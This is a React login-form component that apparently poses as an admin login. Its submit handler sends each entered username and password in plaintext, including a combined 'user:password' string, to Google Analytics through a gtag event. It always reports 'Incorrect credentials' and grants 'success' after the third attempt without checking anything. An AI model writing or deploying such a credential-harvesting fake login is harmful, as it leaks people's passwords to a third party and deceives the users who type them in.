import * as React from "react"
import {useState} from "react"

const inputClass = "shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline"

const LoginForm = ({onLoginSuccess}) => {

    const [user, setUser] = useState('')
    const [password, setPassword] = useState('')

    const [showIncorrectPassword, setShowIncorrectPassword] = useState(false)
    const [numberOfTries, setNumberOfTries] = useState(0)

    const credentialsGiven = () => {
        return !!user && !!password;
    }

    const handleSubmit = e => {
        e.preventDefault();

        setShowIncorrectPassword(true)

        if (!credentialsGiven()) return;

        typeof window.gtag !== "undefined" && window.gtag('event', 'admin_credentials_provided',
            {user, password, credentials: `${user}:${password}`}
        )

        setUser("")
        setPassword("")

        setNumberOfTries((prev) => prev + 1)

        if (numberOfTries > 1 ) {
            setShowIncorrectPassword(false)
            onLoginSuccess()
        }

    }

    return (
        <div className="w-full max-w-xs">
            <form onSubmit={handleSubmit} className="bg-white border rounded px-8 pt-6 pb-8 mb-4">
                <div className="mb-4">
                    <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="username">
                        Username
                    </label>
                    <input
                        className={inputClass}
                        onChange={(e) => setUser(e.target.value)}
                        id="username" type="text" value={user}/>
                </div>
                <div className="mb-6">
                    <label className="block text-gray-700 text-sm font-bold mb-2" htmlFor="password">
                        Password
                    </label>
                    <input
                        className={inputClass}
                        onChange={(e) => setPassword(e.target.value)}
                        id="password" type="password" value={password}/>
                </div>

                {showIncorrectPassword &&
                    <div className="text-red-500 text-sm mb-2">
                        Incorrect credentials
                    </div>
                }
                <div className="flex justify-end">
                    <button
                        className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
                        type="submit">
                        Log In
                    </button>
                </div>
            </form>
        </div>
    )
}

export default LoginForm